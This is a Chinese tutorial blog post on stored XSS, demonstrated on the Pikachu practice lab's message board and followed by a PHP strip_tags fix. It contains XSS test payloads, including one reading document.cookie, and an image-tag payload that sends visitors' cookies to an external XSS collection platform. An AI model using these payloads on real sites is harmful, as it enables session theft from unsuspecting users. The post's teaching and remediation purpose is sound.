---
title: XSS学习03-存储型xss
category: 
- 渗透测试
tags: 
- XSS
---

### 01存储型xss原理

攻击者在页面上插入xss代码，服务端将数据存入数据库，当用户访问到带xss漏洞的页面时，触发payload。达到攻击目的：

![image-20210116223550536](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210116223550536.png)

### 02实战

**预备知识**：了解哪些地方可能存在存储型xss

要知道这个，需要明白xss漏洞需要满足两个条件，及有输入点和输出点，并且用户可控制输入点可以访问输出点。知道这个就可以多去进行一些测试，比如发帖、留言、个人信息等等模块。

常见测试**payload**：

```
<img src=a onerror=alert(1)>  //onerror很容易被过滤！
<img src=a onerror=alert(document.cookie)>  //onerror很容易被过滤！
```

**演示**

1. 环境：pikahu靶场--存储型漏洞（留言板处）
2. xss接收平台：`https://xsshs.cn/`

**步骤**

- 攻击者构造payload提交

![image-20210117195236102](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210117195236102.png)

可以看到，留言成功。

![image-20210117195416668](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210117195416668.png)

此时后台应该有一条记录。接下来换个浏览器访问，模拟普通用户访问，打掉他的cookie。

- 模拟其他用户访问

![image-20210117195546552](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210117195546552.png)

- 后台平台查看记录

![image-20210117195727092](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210117195727092.png)

可以看到，确实有两条记录。一条是攻击者的，一条是普通用户的。我这里故意在chrome开的代理，火狐没开。因此通过ip也能判断出来。

**payload**：`<img sRC=//xsshs.cn/oxlv/xss.jpg>`

注意这里的payload是用的平台的默认模块，初学者只需要简单测试一下payload即可。

### 03漏洞修复

先进数据库把原有的payload清空一下：

![image-20210117220129480](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210117220129480.png)

然后打开源码，定位到message参数传递、处理的位置：

![image-20210117220241990](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20210117220241990.png)

可以看到这里只是对传递进来的参数用escape进行了编码，然后直接存进了数据库。我们可以在这对message参数进行xss过滤。这里使用strip_tags进行过滤：

```php
$_POST['message'] = strip_tags($_POST['message']);
```

接下来重新测试一下。发现不能利用成功了，暂时算是修复了这个xss漏洞。

### 04总结

<!-- more -->